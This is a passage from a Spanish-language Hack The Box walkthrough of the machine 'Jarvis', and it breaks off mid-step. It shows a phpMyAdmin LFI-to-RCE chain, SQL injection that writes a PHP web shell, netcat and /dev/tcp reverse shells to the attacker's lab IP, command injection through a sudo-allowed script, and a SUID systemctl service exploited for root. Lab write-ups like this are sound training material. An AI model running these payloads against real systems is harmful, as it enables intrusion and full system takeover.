-1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-12-26 21:50&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 20.00g/s 19520p/s 19520c/s 19520C/s shadow1..ashlee
-Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como siempre, guardamos las credenciales que tengamos y procedemos a utilizarlas en el panel de login.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya nos encontramos en el dentro del panel de administración de phpmyadmin. Si checamos la versión, vemos que estamos frente a la 4.8.0, por lo que podríamos buscar algún exploit público que nos ayude.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit phpmyadmin 4.8
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-phpMyAdmin 4.8 - Cross-Site Request Forgery                                                    | php/webapps/46982.txt
-phpMyAdmin 4.8.0 &amp;lt; 4.8.0-1 - Cross-Site Request Forgery                                        | php/webapps/44496.html
-phpMyAdmin 4.8.1 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Local File Inclusion &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | php/webapps/44924.txt
-phpMyAdmin 4.8.1 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Local File Inclusion &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | php/webapps/44928.txt
-phpMyAdmin 4.8.4 - &lt;span class=&quot;s1&quot;&gt;'AllowArbitraryServer'&lt;/span&gt; Arbitrary File Read                                  | php/webapps/46041.py
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos 2 los cuales parte de un LFI para obtener RCE y de una manera mejor explicada, podemos consultar el recurso &lt;a href=&quot;https://www.vulnspy.com/phpmyadmin-4.8.1/&quot;&gt;Vulnspy&lt;/a&gt; en donde nos indica que primero debemos contar con credenciales de acceso (ya las tenemos), después realizar la consulta SQL en donde vamos a insertar código php (en el ejemplo se pone &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select '&amp;lt;?php phpinfo();exit;?&amp;gt;'&lt;/code&gt;) en donde pondremos nuestro código malicioso; posteriormente consultamos una sesión generada a partir de la consulta utilizando el valor de la cookie &lt;strong&gt;phpMyAdmin&lt;/strong&gt; (en el ejemplo nos indica que la ruta es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_[el_valor_de_la_cookie]&lt;/code&gt;). Siguiendo dichos pasos, logramos ser el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;, por lo tanto ahora debemos entablarnos una reverse shell para ganar acceso a la máquina (&lt;strong&gt;Nota&lt;/strong&gt;: Si tratamos de hacer lo indicado con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;, es necesario salir de la sesión y volver a entrar al panel de login).&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Generamos nuestra reverse shell: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 443 &amp;gt;/tmp/f&quot;);exit;?&amp;gt;&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;Nos ponemos en escucha por el puerto 443: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nlvp 443&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Con el plugin &lt;strong&gt;Edit this cookie&lt;/strong&gt; obtenemos nuestra cookie para el campo &lt;strong&gt;phpMyAdmin&lt;/strong&gt;: glpacrhpqr2ancitvpu72p59j1jkljoc&lt;/li&gt;
-  &lt;li&gt;Ahora accedemos al siguiente recurso: &lt;strong&gt;10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_glpacrhpqr2ancitvpu72p59j1jkljoc&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-cookie.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39822
-/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
-$ whoami
-www-data
-$ 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;www-data&lt;/strong&gt;; sin embargo, no podemos visualizar la flag.&lt;/p&gt;
-
-&lt;p&gt;Otra manera de comprometer el equipo es mediante la inclusión de archivos en conjunto con la inyección de comandos SQL, para este caso utilizaremos la sentencia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select 1,2,3,4,5,6,7-- -&lt;/code&gt; en lugar de poner el número 3 vamos a tratar de poner un texto y posteriormente guardarlo en un archivo bajo una ruta del sistema, que si recordamos, podemos acceder a &lt;strong&gt;images&lt;/strong&gt; y vamos a suponer que se encuentra en la ruta absoluta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/images&lt;/code&gt;. Por lo tanto, nuestra sentencia sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select 1,2,&quot;Esto es una prueba&quot;,4,5,6,7 into outfile &quot;/var/www/html/images/test.txt&quot;&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que podemos crear archivos y acceder a ellos, por lo que ya debemos estar pensando en tratar de subir de archivo php que nos permita la ejecución de comandos. Nuestra sentencia sería la siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo shell_exec(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;['cmd']); ?&amp;gt;&quot;&lt;/span&gt;,4,5,6,7 into outfile &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/images/shell.php&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Hemos logrado tener ejecución de comandos a nivel de sistema, así que lo único que nos queda es entablarnos una reverse shell a nuestra máquina de atacante y haremos uso de &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;PentestMonkey&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.143/images/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/sh 10.10.14.27 443
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39846
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;www-data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como siempre y para trabajar más comodos, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora vamos a enumerar un poco el sistema para ver la forma en la que podamos escalar privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/var/www/html/images&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@jarvis:/var/www/html/images&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on jarvis:
-    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
-
-User www-data may run the following commands on jarvis:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /var/www/Admin-Utilities/simpler.py
-www-data@jarvis:/var/www/html/images&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que podemos ejecutar el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/Admin-Utilities/simpler.py&lt;/code&gt; como el usuario &lt;strong&gt;pepper&lt;/strong&gt;. Si checamos, tenemos permisos de lectura y una de las opciones que ya nos debería llamar la atención sería el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt;, el cual nos permitiría ejecutar comandos a nivel de sistema como el usuario &lt;strong&gt;pepper&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/var/www/html/images&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; pepper /var/www/Admin-Utilities/simpler.py
-&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
-     _                 _                       
- ___&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
-/ __| | &lt;span class=&quot;s1&quot;&gt;'_ ` _ \| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; | | |
-&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |  __/ |_ | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| |
-|___/_|_| |_| |_| .__/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| .__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |
-                |_|               |_|    |___/ 
-                                @ironhackers.es
-                                
-&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Simpler   -   A simple simplifier &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Version 1.0                                          &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
-Usage:  python3 simpler.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;options]
-
-Options:
-    &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;/--help   : This &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;          : Statistics
-    &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;          : List the attackers IP
-    &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;          : ping an attacker IP
-    
-www-data@jarvis:/var/www/html/images&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podríamos tratar de ejecutar las siguientes opciones:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;10.10.14.27; whoami&lt;/li&gt;
-  &lt;li&gt;10.10.14.27 &amp;amp;&amp;amp; whoami&lt;/li&gt;
-  &lt;li&gt;
-    &lt;table&gt;
-      &lt;tbody&gt;
-        &lt;tr&gt;
-          &lt;td&gt;loquesea&lt;/td&gt;
-          &lt;td&gt; &lt;/td&gt;
-          &lt;td&gt;whoami&lt;/td&gt;
-        &lt;/tr&gt;
-      &lt;/tbody&gt;
-    &lt;/table&gt;
-  &lt;/li&gt;
-  &lt;li&gt;$(whoami)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;El último comando no nos muestra nada y para los anteriores se tiene el mensaje &lt;strong&gt;&lt;em&gt;Got you&lt;/em&gt;&lt;/strong&gt;; por lo que es posible que se esté ejecutando; así que vamos a crear un archivo en bash bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; que nos entable una reverse shell a nuestra máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh 
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1
-www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x shell.sh 
-www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 4
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data 54 Dec 31 23:26 shell.sh
-www-data@jarvis:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora vamos a ejecutar el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;simpler.py&lt;/code&gt; indicanle que queremos ejecutar un comando a nivel de sistema; además nos ponemos en escucha por el puerto 443.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; pepper /var/www/Admin-Utilities/simpler.py &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
-     _                 _                       
- ___&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
-/ __| | &lt;span class=&quot;s1&quot;&gt;'_ ` _ \| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; | | |
-&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |  __/ |_ | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| |
-|___/_|_| |_| |_| .__/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| .__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |
-                |_|               |_|    |___/ 
-                                @ironhackers.es
-                                
-&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
-
-Enter an IP: &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;bash /dev/shm/shell.sh&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39848
-pepper@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;pepper
-pepper@jarvis:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;pepper&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en el usuario &lt;strong&gt;root&lt;/strong&gt;; pero antes, vamos a hacer nuestro &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; para trabajar mejor. Enumeraremos un poco el sitema a ver que hay:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pepper: 
-pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
-pepper@jarvis:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
-./bin/fusermount
-./bin/mount
-./bin/ping
-./bin/systemctl
-./bin/umount
-./bin/su
-./usr/bin/newgrp
-./usr/bin/passwd
-./usr/bin/gpasswd
-./usr/bin/chsh
-./usr/bin/sudo
-./usr/bin/chfn
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/openssh/ssh-keysign
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-pepper@jarvis:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/systemctl&lt;/code&gt; tiene permisos SUID, por lo que podríamos ejecutarlo como el propietario del archivo, en este caso &lt;strong&gt;root&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/systemctl
-&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt; 1 root pepper 174520 Feb 17  2019 /bin/systemctl
-pepper@jarvis:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Asi que vamos a crearnos un servicio y en caso de no saber como, podríamos echarle un ojo al siguiente recurso &lt;a href=&quot;https://www.tecmint.com/create-new-service-units-in-systemd/&quot;&gt;Tecmint&lt;/a&gt;. Asi que en el directorio home del usuario &lt;strong&gt;pepper&lt;/strong&gt; vamos a crear un directorio y dentro el archivo que necesitamos en donde le indicamos que ejecute nuestra reverse shell en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm/&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/pepper/
-pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;privesc
-pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;privesc
-pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano privesc.service
-pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;privesc.service 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unit]
-Description &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Privesc
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]
-&lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;oneshot
-ExecStart &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /dev/shm/shell.sh
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Install]
-WantedBy &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; multi-user.target
-pepper@jarvis:~/privesc&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora creamos un link de nuestro servicio y lo habilitamos, para esto ya debemos estar en escucha por el puerto 443:&lt;/p&gt;
-
